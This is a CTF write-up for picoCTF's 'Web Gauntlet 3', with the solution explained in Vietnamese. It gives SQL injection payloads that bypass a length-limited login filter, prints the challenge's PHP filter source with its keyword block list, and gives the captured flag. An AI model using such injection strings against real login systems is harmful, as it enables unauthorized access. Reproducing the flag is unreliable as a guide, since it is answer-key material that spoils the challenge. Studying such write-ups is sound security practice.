# Web Gauntlet 3

## Description

Last time, I promise! Only 25 characters this time. 
Log in as admin Site: http://mercury.picoctf.net:28715/ 
Filter: http://mercury.picoctf.net:28715/filter.php

## Hint

Each filter is separated by a space. Spaces are not filtered
There is only 1 round this time, when you beat it the flag will be in filter.php.
sqlite

## Point

300 points

## Solution

Chall này ko có nhiều thứ để nói vì nó tương tự như chall 2 , nếu bạn đã thành công bypass được chall 2 thì ý tưởng để làm bài này cũng vậy. Tuy nhiên nó có limit lenght < 25 nhưng cũng ko có gì khó khăn cả .

User bypass : 
> adm'||'in'

Passwd bypass :
> x' IS NOT '1

Ta đem một kí tự số so sánh với một kí tự chữ điều này *IS NOT* trả về true .

QUERY :
> SELECT username, password FROM users WHERE username='adm'||'in' AND password='x' IS NOT '1'

Sau khi bypass bạn chỉ cần truy cập vào trang filter.php để get flag !!!

> filter.php

```
<?php
session_start();

if (!isset($_SESSION["winner3"])) {
    $_SESSION["winner3"] = 0;
}
$win = $_SESSION["winner3"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner3"] = 0;
}

// picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}
?>
```
DONE!
